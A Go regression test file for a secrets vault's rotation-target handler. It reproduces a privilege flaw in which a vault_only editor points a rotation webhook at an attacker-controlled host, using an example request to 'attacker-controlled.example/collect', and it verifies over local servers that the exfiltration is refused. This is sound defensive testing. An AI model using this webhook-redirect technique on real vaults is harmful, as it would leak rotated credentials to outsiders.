package handlers

import (
	"context"
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/bright-interaction/trustissues/internal/vaultegress"
)

// THE ROUND-5 BLOCKER, REPRODUCED END TO END AND THEN CLOSED.
//
// Round 3 pinned destination_patterns. Round 4 pinned provider and
// provider_meta. Round 5 walked through the door next to them:
//
//	PUT /api/vault/{id}/targets
//	[{"type":"webhook","webhook_url":"https://attacker-controlled.example/collect"}]
//	-> 200, stored, configured_by set to the editor
//
// and the scheduled rotation delivered the freshly minted plaintext there. The
// caller is a vault_only account, which is the role the PUBLIC invite-redeem
// endpoint hands out, holding an accepted EDITOR seat on somebody else's shared
// entry. It has no password on the secret, cannot unlock it and cannot reach
// /api/secrets/issue.
//
// NOTHING IN THIS FILE ASSERTS ON A STATUS CODE ALONE. A 403 says what the
// handler decided; a sink that recorded nothing says what the network did. The
// two are different claims and only the second one is the property. Every
// assertion here reads what a real HTTP server RECEIVED.

// deliverySink is a real HTTP server that records the bodies delivered to it.
type deliverySink struct {
	*httptest.Server
	mu       sync.Mutex
	received []string
	hosts    []string
}

func newDeliverySink(t *testing.T) *deliverySink {
	t.Helper()
	s := &deliverySink{}
	s.Server = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		s.mu.Lock()
		s.received = append(s.received, string(b))
		s.hosts = append(s.hosts, r.Method+" "+r.Host+r.URL.Path)
		s.mu.Unlock()
		w.WriteHeader(http.StatusOK)
	}))
	t.Cleanup(s.Close)
	return s
}

func (s *deliverySink) got() ([]string, []string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	return append([]string(nil), s.hosts...), append([]string(nil), s.received...)
}

// hostOf is the sink's host as a rotation target would name it.
func hostOf(t *testing.T, raw string) string {
	t.Helper()
	u, err := url.Parse(raw)
	if err != nil {
		t.Fatalf("parse sink url %q: %v", raw, err)
	}
	return u.Host
}

// TestEditorCannotPointARotationWebhookAtAHostTheyChose is the wire-level proof.
func TestEditorCannotPointARotationWebhookAtAHostTheyChose(t *testing.T) {
	// The SSRF-guarded client refuses loopback, so a real sink is unreachable
	// through it. Swapping it is the only way to observe delivery for real; the
	// authority check under test lives in the handler and in providerDo, neither
	// of which this touches.
	swapProviderHTTP(t)

	h, queries := newCollectionAuthzEnv(t)
	ctx := context.Background()

	const ownerPassword = "correct-horse-battery-staple"
	operator := mustUser(t, queries, "r5-operator@example.com", "user", ownerPassword)
	// vault_only is the role the PUBLIC invite-redeem endpoint hands out.
	attacker := mustUser(t, queries, "r5-attacker@example.com", "vault_only", "")

	mustCollection(t, queries, "coll-r5", operator, map[string]string{
		operator: collRoleManager,
		attacker: collRoleEditor,
	})
	const entryID = "entry-r5"
	const theSecret = "sk_live_OPERATOR_ORIGINAL"
	mustEntry(t, h, queries, entryID, operator, "team-grafana-x", theSecret)
	placeInCollection(t, queries, entryID, "coll-r5")

	consumer := newDeliverySink(t)  // where the operator legitimately delivers
	collector := newDeliverySink(t) // where the attacker wants it

	storedTargets := func() []RotationTarget {
		t.Helper()
		raw, err := queries.GetVaultEntryTargets(ctx, entryID)
		if err != nil {
			t.Fatalf("read targets: %v", err)
		}
		return ParseRotationTargets(h.decryptColumnOrLog(raw.String, "[]", "rotation_targets"))
	}

	// ── STEP 1. The attack, on the real route. ──────────────────────────────
	body := `[{"type":"webhook","label":"backup","webhook_url":"` + collector.URL + `/collect"}]`
	rec := putTargets(t, h, attacker, "vault_only", entryID, body)
	if rec.Code != http.StatusForbidden {
		t.Errorf("PUT /api/vault/{id}/targets by an accepted vault_only editor returned %d, want 403: %s",
			rec.Code, rec.Body.String())
	}
	if !strings.Contains(rec.Body.String(), "egress_widening_denied") {
		t.Errorf("the refusal does not carry the shared egress code, so it is not the same rule the "+
			"ceiling uses: %s", rec.Body.String())
	}
	if !strings.Contains(rec.Body.String(), hostOf(t, collector.URL)) {
		t.Errorf("the refusal does not name the host that was refused, so an operator reading it cannot "+
			"tell what happened: %s", rec.Body.String())
	}
	// Errorf, not Fatalf, deliberately. If the write gate is gone the interesting
	// question is not "was it stored" but "did the plaintext reach the collector",
	// and stopping here would report the weaker of the two. Carrying on means a
	// regression prints the wire evidence rather than a status code.
	if got := storedTargets(); len(got) != 0 {
		t.Errorf("the refused target was stored anyway: %+v", got)
	}

	// ── STEP 2. Rotate for real and read the WIRE, not the status code. ─────
	//
	// The entry carries no provider, so Rotate mints a fresh value locally and
	// then delivers to whatever is stored. This is the exact sequence the
	// original report ended with.
	rotate := func(who, password string) *httptest.ResponseRecorder {
		t.Helper()
		out := httptest.NewRecorder()
		h.Rotate(out, vaultAuthzRequest(http.MethodPost, "/api/vault/"+entryID+"/rotate", who, "user",
			entryID, `{"password":`+quote(password)+`}`))
		if !h.WaitForDelivery(30 * time.Second) {
			t.Fatal("rotation delivery did not drain; the wire assertions below would be racing it")
		}
		return out
	}
	if rr := rotate(operator, ownerPassword); rr.Code != http.StatusOK {
		t.Fatalf("ABORT: the operator could not rotate their own secret (%d: %s); nothing below is "+
			"exercising delivery", rr.Code, rr.Body.String())
	}
	if hosts, bodies := collector.got(); len(hosts) != 0 {
		t.Fatalf("THE ATTACK SUCCEEDED. The attacker's collector received %v carrying %v", hosts, bodies)
	}

	// ── STEP 3. The positive control. ───────────────────────────────────────
	//
	// A guard that refuses everything is not a fix. The entry's owner configures
	// the same kind of target at their own consumer, and the rotated plaintext
	// must actually arrive there.
	ok := putTargets(t, h, operator, "user", entryID,
		`[{"type":"webhook","label":"ci","webhook_url":"`+consumer.URL+`/deploy","webhook_secret":"hmac"}]`)
	if ok.Code != http.StatusOK {
		t.Fatalf("the entry's owner could not configure their own delivery target (%d: %s); the fix has "+
			"broken the feature it was protecting", ok.Code, ok.Body.String())
	}
	if rr := rotate(operator, ownerPassword); rr.Code != http.StatusOK {
		t.Fatalf("rotate with a legitimate target: %d %s", rr.Code, rr.Body.String())
	}
	hosts, bodies := consumer.got()
	if len(bodies) == 0 {
		t.Fatal("the operator's own webhook received NOTHING. The gate is refusing the legitimate " +
			"configurer, which is a break rather than a fix")
	}
	var payload struct {
		Event     string `json:"event"`
		EntryName string `json:"entry_name"`
		NewValue  string `json:"new_value"`
	}
	if err := json.Unmarshal([]byte(bodies[0]), &payload); err != nil {
		t.Fatalf("the consumer received something that is not a delivery payload (%q): %v", bodies[0], err)
	}
	if payload.Event != "vault.key_rotated" || payload.EntryName != "team-grafana-x" || payload.NewValue == "" {
		t.Fatalf("the consumer received %+v, want the rotated value for team-grafana-x", payload)
	}
	if payload.NewValue == theSecret {
		t.Error("the delivered value is the PRE-rotation secret; the rotation did not mint a new one and " +
			"this positive control is not proving delivery of a rotated key")
	}
	t.Logf("wire, legitimate configurer: hosts=%v event=%s entry=%s", hosts, payload.Event, payload.EntryName)

	// And the attacker's collector is STILL empty after a rotation that really
	// delivered. This is the assertion that separates "nothing was delivered at
	// all" from "delivery works and went to the right place".
	if cHosts, cBodies := collector.got(); len(cHosts) != 0 {
		t.Fatalf("the attacker's collector received %v carrying %v", cHosts, cBodies)
	}
}

// TestPlantedEditorTargetIsRefusedAtDeliveryToo covers the row this fix cannot
// see at the write.
//
// UpdateTargets refuses an editor from today. Every row an editor already stored
// on a running instance, and every row that arrives through a restored backup,
// an import or an older binary, is still sitting in the column. The provider pin
// is refused at the write AND at delivery for exactly this reason, and the
// widening right now is too.
func TestPlantedEditorTargetIsRefusedAtDeliveryToo(t *testing.T) {
	swapProviderHTTP(t)

	h, queries := newCollectionAuthzEnv(t)
	ctx := context.Background()

	operator := mustUser(t, queries, "planted-operator@example.com", "user", "")
	attacker := mustUser(t, queries, "planted-attacker@example.com", "vault_only", "")
	mustCollection(t, queries, "coll-planted", operator, map[string]string{
		operator: collRoleManager,
		attacker: collRoleEditor,
	})
	const entryID = "entry-planted"
	mustEntry(t, h, queries, entryID, operator, "team-grafana-x", "sk_live_ORIGINAL")
	placeInCollection(t, queries, entryID, "coll-planted")

	collector := newDeliverySink(t)

	// Plant it the way an older binary did: straight into the column, attributed
	// to a CURRENT, accepted editor, so nothing about membership or account
	// status refuses it.
	planted := []RotationTarget{{
		Type: "webhook", Label: "backup", WebhookURL: collector.URL + "/collect", ConfiguredBy: attacker,
	}}
	encoded, err := json.Marshal(planted)
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}
	enc, err := h.encryptColumn(string(encoded))
	if err != nil {
		t.Fatalf("encrypt: %v", err)
	}
	if err := setRotationTargetsFixture(t, queries, vaultegress.RotationTargetsParams{
		RotationTargets: toNullString(enc), ID: entryID,
	}); err != nil {
		t.Fatalf("plant: %v", err)
	}

	// Guard the setup: the attacker really is an accepted editor with write on
	// this entry right now, so a refusal below cannot be membership in disguise.
	if g := h.grantFor(ctx, attacker, false, entryID); !g.manage {
		t.Fatal("ABORT: the planted configurer does not have manage, so this proves nothing about the " +
			"widening right")
	}

	results := DeliverRotatedKey(ctx, queries, h, entryID, "team-grafana-x",
		h.MintedEntrySecret([]byte("old"), entryID, "team-grafana-x"),
		h.MintedEntrySecret([]byte("sk_live_ROTATED_NEW"), entryID, "team-grafana-x"),
		ParseRotationTargets(h.decryptColumnOrLog(enc, "[]", "rotation_targets")), operator)

	if hosts, bodies := collector.got(); len(hosts) != 0 {
		t.Fatalf("a planted editor-configured webhook received the rotated plaintext: %v %v", hosts, bodies)
	}
	if len(results) != 1 || results[0].Success {
		t.Fatalf("delivery to a planted editor target must FAIL, got %+v", results)
	}
	// Loudly: a silent skip would hide the very row this is here to surface.
	if status, summary := summarizeDelivery(results); status != "partial" || summary == "" {
		t.Fatalf("the refusal did not surface as a partial rotation: status=%q summary=%q", status, summary)
	}
	if strings.Contains(results[0].Error, "sk_live_ROTATED_NEW") {
		t.Fatalf("the refusal leaked the secret: %q", results[0].Error)
	}
}

// quote renders a string as a JSON string literal.
func quote(s string) string {
	b, _ := json.Marshal(s)
	return string(b)
}
